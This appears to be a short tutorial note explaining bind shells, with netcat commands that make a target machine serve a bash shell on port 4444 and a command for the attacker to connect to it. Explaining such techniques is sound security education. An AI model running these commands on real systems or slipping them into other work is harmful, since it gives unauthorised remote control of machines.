A **bind shell** is when the **target system opens a port** and waits for the attacker to connect to it.
### **How It Works:**
1. The attacker exploits the target and makes it **"bind" a shell** to a specific **port** (e.g., 4444).
2. The attacker then connects to that port from their own system.
3. Once connected, they get a shell and can run commands on the target machine.
### **Example:**
- The attacker runs a command on the victim machine:
    ```bash
    nc -lvp 4444 -e /bin/bash
    ```
    (This opens a shell on **port 4444** and waits for connections.)
- The attacker connects from their machine:
    ```bash
    nc 192.168.1.20 4444
    ```
    (Now the attacker has control.)
### **When to Use It?**
- When the target has an **open port** that is not blocked by a firewall.
- Less commonly used because **firewalls often block incoming connections**.